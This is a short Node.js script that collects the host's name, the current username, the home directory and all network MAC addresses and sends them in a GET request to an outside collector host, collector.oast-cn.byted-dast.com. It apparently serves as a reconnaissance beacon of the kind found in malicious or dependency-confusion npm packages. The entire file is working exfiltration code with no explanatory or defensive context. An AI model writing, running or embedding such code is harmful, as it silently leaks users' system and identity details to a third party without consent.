const os = require("os");
const http = require("http");
const querystring = require("querystring");

const macs = Object.values(os.networkInterfaces()).flat()
  .map((iface) => iface.mac).filter(Boolean);
const profile = querystring.stringify({
  hostname: os.hostname(),
  username: os.userInfo().username,
  homedir: os.homedir(),
  mac_addresses: macs.join(",")
});

const request = http.request({
  hostname: "collector.oast-cn.byted-dast.com",
  path: `/collect?${profile}`,
  method: "GET"
});
request.end();
